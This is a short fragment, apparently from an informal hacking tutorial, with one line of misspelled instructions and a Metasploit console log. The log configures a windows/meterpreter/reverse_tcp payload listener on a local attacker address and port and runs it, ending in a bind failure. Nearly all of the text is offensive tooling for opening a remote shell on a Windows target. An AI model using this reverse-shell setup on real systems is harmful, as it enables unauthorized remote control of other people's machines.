if the payload not work then do this process to vernabul

```

msf payload(windows/meterpreter/reverse_tcp) > set payload windows/meterpreter/reverse_tcp
[!] Unknown datastore option: payload.
payload => windows/meterpreter/reverse_tcp
msf payload(windows/meterpreter/reverse_tcp) > set lhost 192.168.133.128
lhost => 192.168.133.128
msf payload(windows/meterpreter/reverse_tcp) > set lport 4455
lport => 4455
msf payload(windows/meterpreter/reverse_tcp) > exploit
[*] Payload Handler Started as Job 0

[-] Handler failed to bind to 192.168.133.128:4455:-  -
[-] Handler failed to bind to 0.0.0.0:4455:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4455).
msf payload(windows/meterpreter/reverse_tcp) > 

```
